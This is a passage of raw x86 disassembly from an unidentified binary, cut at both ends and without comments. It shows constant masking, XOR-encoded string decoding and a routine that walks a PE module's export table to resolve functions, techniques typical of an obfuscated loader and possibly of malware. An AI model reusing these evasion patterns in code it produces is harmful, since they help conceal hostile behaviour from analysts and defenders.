  4267ed:	je     0x42684c
  4267ef:	push   ebx
  4267f0:	push   edi
  4267f1:	movzx  ecx,cx
  4267f4:	mov    edi,0xffcd8d0a
  4267f9:	mov    esi,0x75108af
  4267fe:	mov    ebx,0x4e64
  426803:	cmp    cx,bx
  426806:	jne    0x42680b
  426808:	mov    DWORD PTR [ebp-0x4],edx
  42680b:	lea    edx,[edi+0x1]
  42680e:	xor    edx,esi
  426810:	mov    edi,edx
  426812:	xor    edi,esi
  426814:	mov    cx,WORD PTR [eax+edi*2+0x64e5ec]
  42681c:	mov    ebx,0x3b5d
  426821:	sub    cx,bx
  426824:	mov    ebx,0x8a9b
  426829:	xor    cx,bx
  42682c:	mov    ebx,0x4e38
  426831:	cmp    cx,bx
  426834:	jne    0x4267fe
  426836:	mov    ecx,DWORD PTR [ebp-0x4]
  426839:	pop    edi
  42683a:	pop    ebx
  42683b:	cmp    ecx,0xf89c85a6
  426841:	je     0x42684c
  426843:	xor    ecx,esi
  426845:	lea    eax,[eax+ecx*2+0x64e5ee]
  42684c:	pop    esi
  42684d:	leave  
  42684e:	ret    
  42684f:	push   ebp
  426850:	mov    ebp,esp
  426852:	push   ecx
  426853:	push   esi
  426854:	push   edi
  426855:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  42685c:	mov    esi,0xf89c85a5
  426861:	call   0x4267c1
  426866:	mov    edi,eax
  426868:	mov    al,BYTE PTR [edi]
  42686a:	sub    al,0x4
  42686c:	xor    al,0x7f
  42686e:	cmp    al,0x83
  426870:	je     0x4268d3
  426872:	mov    eax,edi
  426874:	mov    edx,0xffcd8d0a
  426879:	mov    ecx,0x75108af
  42687e:	push   ebx
  42687f:	mov    ax,WORD PTR [eax]
  426882:	mov    ebx,0x3b5d
  426887:	sub    ax,bx
  42688a:	mov    ebx,0x8a9b
  42688f:	xor    ax,bx
  426892:	mov    ebx,0x4e4a
  426897:	cmp    ax,bx
  42689a:	jne    0x42689f
  42689c:	mov    DWORD PTR [ebp-0x4],esi
  42689f:	lea    esi,[edx+0x1]
  4268a2:	xor    esi,ecx
  4268a4:	mov    edx,esi
  4268a6:	xor    edx,ecx
  4268a8:	lea    eax,[edi+edx*2+0x64e5ec]
  4268af:	mov    bl,BYTE PTR [eax]
  4268b1:	sub    bl,0x4
  4268b4:	xor    bl,0x7f
  4268b7:	cmp    bl,0x83
  4268ba:	jne    0x42687f
  4268bc:	mov    eax,DWORD PTR [ebp-0x4]
  4268bf:	pop    ebx
  4268c0:	cmp    eax,0xf89c85a6
  4268c5:	je     0x4268d3
  4268c7:	xor    eax,ecx
  4268c9:	xor    ecx,ecx
  4268cb:	mov    WORD PTR [edi+eax*2+0x64e5ec],cx
  4268d3:	mov    eax,edi
  4268d5:	pop    edi
  4268d6:	pop    esi
  4268d7:	leave  
  4268d8:	ret    
  4268d9:	push   ebp
  4268da:	mov    ebp,esp
  4268dc:	push   ecx
  4268dd:	push   esi
  4268de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4268e5:	mov    esi,0xf89c85a5
  4268ea:	call   0x4267c1
  4268ef:	mov    cx,WORD PTR [eax]
  4268f2:	mov    edx,0x3b5d
  4268f7:	sub    cx,dx
  4268fa:	mov    edx,0x8a9b
  4268ff:	xor    cx,dx
  426902:	mov    edx,0x4e38
  426907:	cmp    cx,dx
  42690a:	je     0x426963
  42690c:	push   ebx
  42690d:	push   edi
  42690e:	movzx  ecx,cx
  426911:	mov    edx,0xffcd8d0a
  426916:	mov    edi,0x75108af
  42691b:	mov    ebx,0x4e4a
  426920:	cmp    cx,bx
  426923:	jne    0x426928
  426925:	mov    DWORD PTR [ebp-0x4],esi
  426928:	lea    esi,[edx+0x1]
  42692b:	xor    esi,edi
  42692d:	mov    edx,esi
  42692f:	xor    edx,edi
  426931:	mov    cx,WORD PTR [eax+edx*2+0x64e5ec]
  426939:	mov    ebx,0x3b5d
  42693e:	sub    cx,bx
  426941:	mov    ebx,0x8a9b
  426946:	xor    cx,bx
  426949:	mov    ebx,0x4e38
  42694e:	cmp    cx,bx
  426951:	jne    0x42691b
  426953:	cmp    DWORD PTR [ebp-0x4],0xf89c85a6
  42695a:	pop    edi
  42695b:	pop    ebx
  42695c:	je     0x426963
  42695e:	xor    eax,eax
  426960:	inc    eax
  426961:	jmp    0x426965
  426963:	xor    eax,eax
  426965:	pop    esi
  426966:	leave  
  426967:	ret    
  426968:	push   ebp
  426969:	mov    ebp,esp
  42696b:	push   ecx
  42696c:	mov    eax,DWORD PTR [ebp+0x8]
  42696f:	movzx  ecx,WORD PTR [eax]
  426972:	push   esi
  426973:	lea    eax,[ecx-0x3b5d]
  426979:	mov    esi,0x8a9b
  42697e:	push   edi
  42697f:	xor    eax,esi
  426981:	mov    edi,0x4e38
  426986:	mov    DWORD PTR [ebp-0x4],edx
  426989:	cmp    ax,di
  42698c:	je     0x4269b9
  42698e:	mov    eax,DWORD PTR [ebp+0x8]
  426991:	sub    eax,edx
  426993:	mov    DWORD PTR [ebp+0x8],eax
  426996:	jmp    0x42699b
  426998:	mov    eax,DWORD PTR [ebp+0x8]
  42699b:	mov    WORD PTR [edx],cx
  42699e:	add    edx,0x2
  4269a1:	movzx  edi,WORD PTR [eax+edx*1]
  4269a5:	mov    ecx,edi
  4269a7:	add    edi,0xffffc4a3
  4269ad:	xor    edi,esi
  4269af:	mov    eax,0x4e38
  4269b4:	cmp    di,ax
  4269b7:	jne    0x426998
  4269b9:	xor    eax,eax
  4269bb:	pop    edi
  4269bc:	mov    WORD PTR [edx],ax
  4269bf:	mov    eax,DWORD PTR [ebp-0x4]
  4269c2:	pop    esi
  4269c3:	leave  
  4269c4:	ret    0x4
  4269c7:	push   ebp
  4269c8:	mov    ebp,esp
  4269ca:	sub    esp,0x18
  4269cd:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  4269d4:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  4269db:	mov    ecx,DWORD PTR [ebp-0x8]
  4269de:	push   esi
  4269df:	mov    eax,0x75108af
  4269e4:	xor    ecx,eax
  4269e6:	mov    esi,0x3272f6
  4269eb:	add    ecx,esi
  4269ed:	mov    DWORD PTR [ebp-0x4],ecx
  4269f0:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4269f7:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  4269fe:	push   edi
  4269ff:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  426a06:	jmp    0x426aa7
  426a0b:	mov    ecx,DWORD PTR [ebp-0x4]
  426a0e:	mov    edx,DWORD PTR [ebp+0x10]
  426a11:	sub    edx,ecx
  426a13:	mov    ecx,DWORD PTR [ebp-0xc]
  426a16:	xor    ecx,eax
  426a18:	add    ecx,esi
  426a1a:	cmp    edx,ecx
  426a1c:	jbe    0x426a39
  426a1e:	mov    edx,DWORD PTR [ebp-0x4]
  426a21:	add    edx,DWORD PTR [ebp+0x8]
  426a24:	mov    ecx,DWORD PTR [ebp-0x4]
  426a27:	add    ecx,DWORD PTR [ebp+0xc]
  426a2a:	mov    edi,DWORD PTR [ecx]
  426a2c:	mov    DWORD PTR [edx],edi
  426a2e:	mov    ecx,DWORD PTR [ecx+0x4]
  426a31:	mov    DWORD PTR [edx+0x4],ecx
  426a34:	mov    ecx,DWORD PTR [ebp-0xc]
  426a37:	jmp    0x426a86
  426a39:	mov    ecx,DWORD PTR [ebp-0x4]
  426a3c:	mov    edx,DWORD PTR [ebp+0x10]
  426a3f:	sub    edx,ecx
  426a41:	mov    ecx,DWORD PTR [ebp-0x10]
  426a44:	xor    ecx,eax
  426a46:	add    ecx,esi
  426a48:	cmp    edx,ecx
  426a4a:	mov    ecx,DWORD PTR [ebp-0x4]
  426a4d:	jbe    0x426a61
  426a4f:	add    ecx,DWORD PTR [ebp+0x8]
  426a52:	mov    edx,DWORD PTR [ebp-0x4]
  426a55:	add    edx,DWORD PTR [ebp+0xc]
  426a58:	mov    edx,DWORD PTR [edx]
  426a5a:	mov    DWORD PTR [ecx],edx
  426a5c:	mov    ecx,DWORD PTR [ebp-0x10]
  426a5f:	jmp    0x426a86
  426a61:	mov    edx,DWORD PTR [ebp+0x10]
  426a64:	sub    edx,ecx
  426a66:	mov    ecx,DWORD PTR [ebp-0x14]
  426a69:	xor    ecx,eax
  426a6b:	add    ecx,esi
  426a6d:	cmp    edx,ecx
  426a6f:	mov    ecx,DWORD PTR [ebp-0x4]
  426a72:	jbe    0x426a97
  426a74:	add    ecx,DWORD PTR [ebp+0x8]
  426a77:	mov    edx,DWORD PTR [ebp-0x4]
  426a7a:	add    edx,DWORD PTR [ebp+0xc]
  426a7d:	mov    dx,WORD PTR [edx]
  426a80:	mov    WORD PTR [ecx],dx
  426a83:	mov    ecx,DWORD PTR [ebp-0x14]
  426a86:	mov    edx,DWORD PTR [ebp-0x4]
  426a89:	xor    ecx,eax
  426a8b:	lea    ecx,[ecx+edx*1+0x3272f6]
  426a92:	mov    DWORD PTR [ebp-0x4],ecx
  426a95:	jmp    0x426aa7
  426a97:	add    ecx,DWORD PTR [ebp+0x8]
  426a9a:	mov    edx,DWORD PTR [ebp-0x4]
  426a9d:	add    edx,DWORD PTR [ebp+0xc]
  426aa0:	mov    dl,BYTE PTR [edx]
  426aa2:	mov    BYTE PTR [ecx],dl
  426aa4:	inc    DWORD PTR [ebp-0x4]
  426aa7:	mov    ecx,DWORD PTR [ebp-0x18]
  426aaa:	mov    edx,DWORD PTR [ebp+0x10]
  426aad:	xor    ecx,eax
  426aaf:	add    ecx,esi
  426ab1:	imul   ecx,edx
  426ab4:	mov    edx,DWORD PTR [ebp-0x8]
  426ab7:	mov    edi,DWORD PTR [ebp-0x4]
  426aba:	xor    edx,eax
  426abc:	lea    edx,[edx+edi*1+0x3272f6]
  426ac3:	cmp    edx,ecx
  426ac5:	jb     0x426a0b
  426acb:	pop    edi
  426acc:	pop    esi
  426acd:	leave  
  426ace:	ret    0xc
  426ad1:	push   ebp
  426ad2:	mov    ebp,esp
  426ad4:	sub    esp,0xc
  426ad7:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426ade:	push   esi
  426adf:	mov    esi,eax
  426ae1:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  426ae8:	mov    edx,DWORD PTR [ebp-0x4]
  426aeb:	mov    eax,0x75108af
  426af0:	xor    edx,eax
  426af2:	mov    ecx,0x3272f6
  426af7:	add    edx,ecx
  426af9:	cmp    esi,edx
  426afb:	je     0x426b3d
  426afd:	push   ebx
  426afe:	push   edi
  426aff:	mov    edx,DWORD PTR [ebp-0x8]
  426b02:	mov    ebx,DWORD PTR [ebp+0x8]
  426b05:	xor    edx,eax
  426b07:	mov    edi,0xffcd8d0a
  426b0c:	sub    edi,edx
  426b0e:	add    esi,edi
  426b10:	lea    edx,[esi-0x3272f6]
  426b16:	xor    edx,eax
  426b18:	mov    DWORD PTR [ebp-0xc],edx
  426b1b:	mov    edx,DWORD PTR [ebp-0x4]
  426b1e:	mov    edi,DWORD PTR [ebp-0xc]
  426b21:	xor    dl,0xaf
  426b24:	sub    dl,0xa
  426b27:	xor    edi,eax
  426b29:	mov    BYTE PTR [edi+ebx*1+0x3272f6],dl
  426b30:	mov    edx,DWORD PTR [ebp-0x4]
  426b33:	xor    edx,eax
  426b35:	add    edx,ecx
  426b37:	cmp    esi,edx
  426b39:	jne    0x426aff
  426b3b:	pop    edi
  426b3c:	pop    ebx
  426b3d:	pop    esi
  426b3e:	leave  
  426b3f:	ret    0x4
  426b42:	push   ebp
  426b43:	mov    ebp,esp
  426b45:	sub    esp,0x21c
  426b4b:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426b52:	mov    DWORD PTR [ebp-0x14],0xf89c85a4
  426b59:	mov    eax,DWORD PTR [ebp+0x10]
  426b5c:	mov    eax,DWORD PTR [ebp-0x4]
  426b5f:	mov    ecx,DWORD PTR [ebp+0x8]
  426b62:	push   esi
  426b63:	push   edi
  426b64:	mov    edi,0x75108af
  426b69:	xor    eax,edi
  426b6b:	mov    esi,0x3272f6
  426b70:	add    eax,esi
  426b72:	cmp    eax,ecx
  426b74:	mov    eax,DWORD PTR [ebp-0x4]
  426b77:	jne    0x426b82
  426b79:	xor    eax,edi
  426b7b:	add    eax,esi
  426b7d:	jmp    0x426c2e
  426b82:	mov    ecx,DWORD PTR [ebp+0xc]
  426b85:	xor    eax,edi
  426b87:	add    eax,esi
  426b89:	cmp    eax,ecx
  426b8b:	jne    0x426b92
  426b8d:	mov    eax,DWORD PTR [ebp-0x4]
  426b90:	jmp    0x426b79
  426b92:	lea    eax,[ebp-0x21c]
  426b98:	mov    DWORD PTR [ebp-0x8],eax
  426b9b:	mov    eax,DWORD PTR [ebp+0xc]
  426b9e:	mov    DWORD PTR [ebp-0x10],eax
  426ba1:	mov    eax,DWORD PTR [ebp-0x4]
  426ba4:	xor    eax,edi
  426ba6:	add    eax,esi
  426ba8:	mov    DWORD PTR [ebp+0x10],eax
  426bab:	mov    eax,DWORD PTR [ebp+0xc]
  426bae:	push   ebx
  426baf:	call   0x4268d9
  426bb4:	mov    ebx,eax
  426bb6:	mov    eax,DWORD PTR [ebp+0x8]
  426bb9:	mov    eax,DWORD PTR [eax+0x14]
  426bbc:	jmp    0x426c16
  426bbe:	mov    eax,DWORD PTR [ebp+0xc]
  426bc1:	sub    eax,0x8
  426bc4:	mov    DWORD PTR [ebp-0xc],eax
  426bc7:	mov    eax,DWORD PTR [ebp-0xc]
  426bca:	mov    eax,DWORD PTR [eax+0x28]
  426bcd:	call   0x4267c1
  426bd2:	mov    DWORD PTR [ebp+0x10],eax
  426bd5:	push   DWORD PTR [ebp+0x10]
  426bd8:	mov    edx,DWORD PTR [ebp-0x8]
  426bdb:	call   0x426968
  426be0:	mov    eax,DWORD PTR [ebp-0x4]
  426be3:	xor    eax,edi
  426be5:	add    eax,esi
  426be7:	cmp    eax,ebx
  426be9:	jne    0x426bf3
  426beb:	mov    eax,DWORD PTR [ebp-0x8]
  426bee:	call   0x42684f
  426bf3:	mov    eax,DWORD PTR [ebp-0x14]
  426bf6:	xor    eax,edi
  426bf8:	add    eax,esi
  426bfa:	push   eax
  426bfb:	push   DWORD PTR [ebp-0x10]
  426bfe:	mov    eax,DWORD PTR [ebp-0x8]
  426c01:	call   0x42657b
  426c06:	mov    ecx,DWORD PTR [ebp-0x4]
  426c09:	xor    ecx,edi
  426c0b:	add    ecx,esi
  426c0d:	cmp    eax,ecx
  426c0f:	je     0x426c34
  426c11:	mov    eax,DWORD PTR [ebp+0xc]
  426c14:	mov    eax,DWORD PTR [eax]
  426c16:	mov    DWORD PTR [ebp+0xc],eax
  426c19:	mov    eax,DWORD PTR [ebp+0x8]
  426c1c:	mov    ecx,DWORD PTR [ebp+0xc]
  426c1f:	add    eax,0x14
  426c22:	cmp    ecx,eax
  426c24:	jne    0x426bbe
  426c26:	mov    eax,DWORD PTR [ebp-0x4]
  426c29:	xor    eax,edi
  426c2b:	add    eax,esi
  426c2d:	pop    ebx
  426c2e:	pop    edi
  426c2f:	pop    esi
  426c30:	leave  
  426c31:	ret    0xc
  426c34:	mov    eax,DWORD PTR [ebp-0xc]
  426c37:	mov    eax,DWORD PTR [eax+0x18]
  426c3a:	jmp    0x426c2d
  426c3c:	push   ebp
  426c3d:	mov    ebp,esp
  426c3f:	mov    eax,DWORD PTR [ebp+0xc]
  426c42:	sub    esp,0x10
  426c45:	cmp    DWORD PTR [ebp+0x8],0x0
  426c49:	push   ebx
  426c4a:	push   esi
  426c4b:	push   edi
  426c4c:	je     0x426d01
  426c52:	test   eax,eax
  426c54:	je     0x426d01
  426c5a:	movzx  eax,WORD PTR [eax+0x20]
  426c5e:	mov    ecx,eax
  426c60:	mov    DWORD PTR [ebp-0x10],eax
  426c63:	xor    edx,edx
  426c65:	and    DWORD PTR [ebp-0x8],edx
  426c68:	mov    eax,0x8a9b
  426c6d:	xor    ecx,eax
  426c6f:	add    ecx,0x3b5d
  426c75:	mov    DWORD PTR [ebp-0xc],ecx
  426c78:	and    DWORD PTR [ebp-0x4],0x0
  426c7c:	xor    ecx,ecx
  426c7e:	push   0xffffff81
  426c80:	pop    edi
  426c81:	cmp    cx,WORD PTR [ebp-0xc]
  426c85:	jae    0x426ceb
  426c87:	lea    esi,[edx-0x3b5d]
  426c8d:	xor    esi,eax
  426c8f:	movzx  ecx,WORD PTR [ebp-0x4]
  426c93:	mov    ebx,DWORD PTR [ebp+0xc]
  426c96:	lea    ecx,[ebx+ecx*4]
  426c99:	cmp    WORD PTR [ecx+0x2],si
  426c9d:	jne    0x426cd6
  426c9f:	movzx  ecx,WORD PTR [ecx]
  426ca2:	mov    edi,0x4e38
  426ca7:	cmp    cx,di
  426caa:	jne    0x426cb8
  426cac:	mov    ebx,DWORD PTR [ebp+0x8]
  426caf:	movzx  edi,dx
  426cb2:	cmp    BYTE PTR [edi+ebx*1],0x0
  426cb6:	je     0x426ce5
  426cb8:	mov    ebx,DWORD PTR [ebp+0x8]
  426cbb:	movzx  edi,dx
  426cbe:	movsx  di,BYTE PTR [edi+ebx*1]
  426cc3:	mov    ebx,0x3b5d
  426cc8:	sub    di,bx
  426ccb:	xor    di,ax
  426cce:	cmp    cx,di
  426cd1:	je     0x426ce5
  426cd3:	push   0xffffff83
  426cd5:	pop    edi
  426cd6:	inc    DWORD PTR [ebp-0x4]
  426cd9:	mov    cx,WORD PTR [ebp-0xc]
  426cdd:	cmp    WORD PTR [ebp-0x4],cx
  426ce1:	jb     0x426c8f
  426ce3:	jmp    0x426ceb
  426ce5:	inc    DWORD PTR [ebp-0x8]
  426ce8:	push   0xffffff82
  426cea:	pop    edi
  426ceb:	mov    esi,DWORD PTR [ebp+0x8]
  426cee:	movzx  ecx,dx
  426cf1:	cmp    BYTE PTR [ecx+esi*1],0x0
  426cf5:	je     0x426d0a
  426cf7:	inc    edx
  426cf8:	cmp    edi,0xffffff83
  426cfb:	jne    0x426c78
  426d01:	xor    eax,eax
  426d03:	pop    edi
  426d04:	pop    esi
  426d05:	pop    ebx
  426d06:	leave  
  426d07:	ret    0x8
  426d0a:	mov    ecx,DWORD PTR [ebp-0x8]
  426d0d:	add    ecx,0xffffc4a3
  426d13:	xor    cx,ax
  426d16:	xor    eax,eax
  426d18:	cmp    cx,WORD PTR [ebp-0x10]
  426d1c:	sete   al
  426d1f:	jmp    0x426d03
  426d21:	push   ebp
  426d22:	mov    ebp,esp
  426d24:	sub    esp,0x50
  426d27:	push   edi
  426d28:	mov    edi,eax
  426d2a:	mov    eax,DWORD PTR [edi+0x1a8]
  426d30:	cmp    DWORD PTR [eax],0x0
  426d33:	jne    0x426d3c
  426d35:	xor    eax,eax
  426d37:	jmp    0x426e6d
  426d3c:	push   DWORD PTR [ebp+0x8]
  426d3f:	push   0x2c
  426d41:	pop    eax
  426d42:	call   0x426ad1
  426d47:	mov    edx,DWORD PTR [edi+0x1ac]
  426d4d:	lea    eax,[edi+0x22]
  426d50:	mov    DWORD PTR [ebp-0x4c],eax
  426d53:	lea    eax,[edi+0x44]
  426d56:	mov    DWORD PTR [ebp-0x48],eax
  426d59:	lea    eax,[edi+0x66]
  426d5c:	mov    DWORD PTR [ebp-0x44],eax
  426d5f:	lea    eax,[edi+0x88]
  426d65:	mov    DWORD PTR [ebp-0x40],eax
  426d68:	lea    eax,[edi+0xaa]
  426d6e:	mov    DWORD PTR [ebp-0x3c],eax
  426d71:	lea    eax,[edi+0xcc]
  426d77:	mov    DWORD PTR [ebp-0x38],eax
  426d7a:	lea    eax,[edi+0xee]
  426d80:	mov    DWORD PTR [ebp-0x34],eax
  426d83:	lea    eax,[edi+0x110]
  426d89:	mov    DWORD PTR [ebp-0x30],eax
  426d8c:	lea    eax,[edi+0x132]
  426d92:	mov    DWORD PTR [ebp-0x2c],eax
  426d95:	lea    eax,[edi+0x154]
  426d9b:	push   edi
  426d9c:	mov    DWORD PTR [ebp-0x50],edi
  426d9f:	mov    DWORD PTR [ebp-0x28],eax
  426da2:	call   0x426ea1
  426da7:	push   eax
  426da8:	mov    eax,DWORD PTR [edi+0x1a8]
  426dae:	push   DWORD PTR [eax]
  426db0:	call   0x426b42
  426db5:	mov    DWORD PTR [ebp-0x10],eax
  426db8:	test   eax,eax
  426dba:	je     0x426e6d
  426dc0:	mov    ecx,DWORD PTR [eax+0x3c]
  426dc3:	push   ebx
  426dc4:	push   esi
  426dc5:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  426dc9:	add    esi,eax
  426dcb:	mov    edi,DWORD PTR [esi+0x24]
  426dce:	mov    ecx,DWORD PTR [esi+0x1c]
  426dd1:	mov    edx,DWORD PTR [esi+0x20]
  426dd4:	mov    ebx,DWORD PTR [esi+0x18]
  426dd7:	add    edi,eax
  426dd9:	mov    DWORD PTR [ebp-0x20],edi
  426ddc:	mov    edi,DWORD PTR [esi+0x14]
  426ddf:	add    ecx,eax
  426de1:	add    edx,eax
  426de3:	mov    DWORD PTR [ebp-0xc],ecx
  426de6:	mov    DWORD PTR [ebp-0x1c],edx
  426de9:	mov    DWORD PTR [ebp-0x8],edi
  426dec:	cmp    edi,ebx
  426dee:	ja     0x426df3
  426df0:	mov    DWORD PTR [ebp-0x8],ebx
  426df3:	xor    ebx,ebx
  426df5:	mov    DWORD PTR [ebp-0x18],ebx
  426df8:	cmp    DWORD PTR [ebp-0x8],ebx
  426dfb:	jbe    0x426e6b
  426dfd:	jmp    0x426e02
  426dff:	mov    edx,DWORD PTR [ebp-0x1c]
  426e02:	mov    edi,DWORD PTR [ebp-0x20]
  426e05:	movzx  edi,WORD PTR [edi+ebx*2]
  426e09:	cmp    ebx,DWORD PTR [esi+0x18]
  426e0c:	jae    0x426e6b
  426e0e:	cmp    edi,DWORD PTR [esi+0x14]
  426e11:	jae    0x426e6b
  426e13:	mov    ebx,DWORD PTR [edx+ebx*4]
  426e16:	mov    edx,DWORD PTR [ebp+0x8]
  426e19:	mov    edi,DWORD PTR [ecx+edi*4]
  426e1c:	mov    DWORD PTR [ebp-0x4],edx
  426e1f:	lea    edx,[ebp-0x50]
  426e22:	add    ebx,eax
  426e24:	add    edi,eax
  426e26:	sub    edx,DWORD PTR [ebp+0x8]
  426e29:	mov    DWORD PTR [ebp-0x14],0xb
  426e30:	mov    DWORD PTR [ebp-0x24],edx
  426e33:	mov    edx,DWORD PTR [ebp-0x4]
  426e36:	cmp    DWORD PTR [edx],0x0
  426e39:	jne    0x426e56
  426e3b:	mov    eax,DWORD PTR [ebp-0x24]
  426e3e:	push   DWORD PTR [eax+edx*1]
  426e41:	push   ebx
  426e42:	call   0x426c3c
  426e47:	mov    ecx,DWORD PTR [ebp-0xc]
  426e4a:	test   eax,eax
  426e4c:	je     0x426e53
  426e4e:	mov    eax,DWORD PTR [ebp-0x4]
  426e51:	mov    DWORD PTR [eax],edi
  426e53:	mov    eax,DWORD PTR [ebp-0x10]
  426e56:	add    DWORD PTR [ebp-0x4],0x4
  426e5a:	dec    DWORD PTR [ebp-0x14]
  426e5d:	jne    0x426e33
  426e5f:	mov    ebx,DWORD PTR [ebp-0x18]
  426e62:	inc    ebx
  426e63:	mov    DWORD PTR [ebp-0x18],ebx
  426e66:	cmp    ebx,DWORD PTR [ebp-0x8]
  426e69:	jb     0x426dff
  426e6b:	pop    esi
  426e6c:	pop    ebx
  426e6d:	pop    edi
  426e6e:	leave  
  426e6f:	ret    0x4
  426e72:	push   ebp
  426e73:	mov    ebp,esp
  426e75:	mov    eax,DWORD PTR [ebp+0x8]
  426e78:	push   esi
  426e79:	push   DWORD PTR [eax+0x1e0]
  426e7f:	lea    esi,[eax+0x198]
  426e85:	mov    eax,DWORD PTR [ebp+0x8]
  426e88:	call   0x426d21
  426e8d:	mov    ecx,DWORD PTR [esi]
  426e8f:	mov    DWORD PTR [ecx],eax
  426e91:	mov    eax,DWORD PTR [esi]
  426e93:	xor    ecx,ecx
  426e95:	cmp    DWORD PTR [eax],ecx
  426e97:	pop    esi
  426e98:	setne  cl
  426e9b:	mov    eax,ecx
  426e9d:	pop    ebp
  426e9e:	ret    0x4
  426ea1:	mov    ecx,DWORD PTR [edi+0x188]
  426ea7:	push   ebx
  426ea8:	jmp    0x426ebd
  426eaa:	xor    eax,0x8a9b
  426eaf:	add    eax,0x3b5d
  426eb4:	mov    WORD PTR [ecx],ax
  426eb7:	add    ecx,0x2
  426eba:	add    edx,0x2
  426ebd:	movzx  eax,WORD PTR [edx]
  426ec0:	mov    ebx,0x4e38
  426ec5:	cmp    ax,bx
  426ec8:	jne    0x426eaa
  426eca:	xor    eax,eax
  426ecc:	mov    WORD PTR [ecx],ax
  426ecf:	mov    eax,DWORD PTR [edi+0x188]
  426ed5:	pop    ebx
  426ed6:	ret    
  426ed7:	push   edi
  426ed8:	mov    edi,eax
  426eda:	mov    eax,DWORD PTR [esi+0x188]
  426ee0:	shl    edi,0x6
  426ee3:	add    eax,edi
  426ee5:	jmp    0x426ef1
  426ee7:	xor    cl,0x7f
  426eea:	add    cl,0x4
  426eed:	mov    BYTE PTR [eax],cl
  426eef:	inc    eax
  426ef0:	inc    edx
  426ef1:	mov    cl,BYTE PTR [edx]
  426ef3:	cmp    cl,0x83
  426ef6:	jne    0x426ee7
  426ef8:	mov    BYTE PTR [eax],0x0
  426efb:	mov    eax,DWORD PTR [esi+0x188]
  426f01:	add    eax,edi
  426f03:	pop    edi
  426f04:	ret    
  426f05:	push   ebp
  426f06:	mov    ebp,esp
  426f08:	sub    esp,0x14
  426f0b:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  426f12:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  426f19:	mov    eax,DWORD PTR [ebx]
  426f1b:	mov    DWORD PTR [ebp-0x8],eax
  426f1e:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  426f25:	push   esi
  426f26:	push   edi
  426f27:	mov    DWORD PTR [ebp-0x14],0xead71885
  426f2e:	mov    edi,DWORD PTR [ebp-0x4]
  426f31:	mov    ecx,DWORD PTR [ebp-0x10]
  426f34:	mov    eax,0x75108af
  426f39:	xor    edi,eax
  426f3b:	mov    edx,0x3272f6
  426f40:	xor    ecx,eax
  426f42:	add    edi,edx
  426f44:	add    ecx,edx
  426f46:	imul   edi,ecx
  426f49:	jmp    0x426f91
  426f4b:	mov    ecx,DWORD PTR [ebp-0x8]
  426f4e:	mov    esi,DWORD PTR [ebp-0x4]
  426f51:	xor    ecx,eax
  426f53:	xor    esi,eax
  426f55:	add    ecx,edx
  426f57:	add    esi,edx
  426f59:	test   esi,ecx
  426f5b:	mov    esi,DWORD PTR [ebp-0x8]
  426f5e:	mov    ecx,DWORD PTR [ebp-0x4]
  426f61:	je     0x426f78
  426f63:	xor    ecx,eax
  426f65:	xor    esi,eax
  426f67:	add    ecx,edx
  426f69:	add    esi,edx
  426f6b:	shr    esi,cl
  426f6d:	mov    ecx,DWORD PTR [ebp-0x14]
  426f70:	xor    ecx,eax
  426f72:	add    ecx,edx
  426f74:	xor    esi,ecx
  426f76:	jmp    0x426f82
  426f78:	xor    esi,eax
  426f7a:	xor    ecx,eax
  426f7c:	add    esi,edx
  426f7e:	add    ecx,edx
  426f80:	shr    esi,cl
  426f82:	mov    DWORD PTR [ebp-0x8],esi
  426f85:	mov    ecx,DWORD PTR [ebp-0x4]
  426f88:	xor    ecx,eax
  426f8a:	lea    edi,[edi+ecx*1+0x3272f6]
  426f91:	mov    ecx,DWORD PTR [ebp-0xc]
  426f94:	mov    esi,DWORD PTR [ebp-0x4]
  426f97:	xor    esi,eax
  426f99:	xor    ecx,eax
  426f9b:	sub    ecx,esi
  426f9d:	cmp    edi,ecx
  426f9f:	jbe    0x426f4b
  426fa1:	mov    eax,DWORD PTR [ebp-0x8]
  426fa4:	pop    edi
  426fa5:	mov    DWORD PTR [ebx],eax
  426fa7:	mov    eax,DWORD PTR [ebp-0x8]
  426faa:	pop    esi
  426fab:	leave  
  426fac:	ret    
  426fad:	push   ebp
  426fae:	mov    ebp,esp
  426fb0:	sub    esp,0x38
  426fb3:	push   ebx
  426fb4:	mov    ebx,0xf89c85a5
  426fb9:	mov    DWORD PTR [ebp-0x4],ebx
  426fbc:	lea    ecx,[ebx-0x1]
  426fbf:	mov    DWORD PTR [ebp-0x24],ecx
  426fc2:	mov    eax,DWORD PTR [ebp-0x4]
  426fc5:	mov    edx,DWORD PTR [ebp+0x8]
  426fc8:	push   esi
  426fc9:	mov    esi,0x75108af
  426fce:	xor    eax,esi
  426fd0:	push   edi
  426fd1:	mov    edi,0x3272f6
  426fd6:	add    eax,edi
  426fd8:	cmp    edx,eax
  426fda:	mov    eax,DWORD PTR [ebp-0x4]
  426fdd:	je     0x427142
  426fe3:	mov    edx,DWORD PTR [ebp+0xc]
  426fe6:	xor    eax,esi
  426fe8:	add    eax,edi
  426fea:	cmp    edx,eax
  426fec:	je     0x42713f
  426ff2:	mov    eax,DWORD PTR [ebp+0x10]
  426ff5:	mov    edx,DWORD PTR [ebp+0xc]
  426ff8:	mov    DWORD PTR [ebp-0x14],eax
  426ffb:	mov    eax,DWORD PTR [ebp+0x8]
  426ffe:	mov    DWORD PTR [ebp-0x18],0xf89c853c
  427005:	mov    DWORD PTR [ebp-0xc],eax
  427008:	lea    eax,[ebx-0x2]
  42700b:	mov    DWORD PTR [ebp-0x1c],eax
  42700e:	mov    DWORD PTR [ebp-0x10],ebx
  427011:	mov    DWORD PTR [ebp+0xc],ecx
  427014:	mov    DWORD PTR [ebp+0x10],eax
  427017:	mov    eax,DWORD PTR [ebp+0xc]
  42701a:	xor    eax,esi
  42701c:	mov    DWORD PTR [ebp-0x20],edx
  42701f:	sub    edx,eax
  427021:	sub    edx,edi
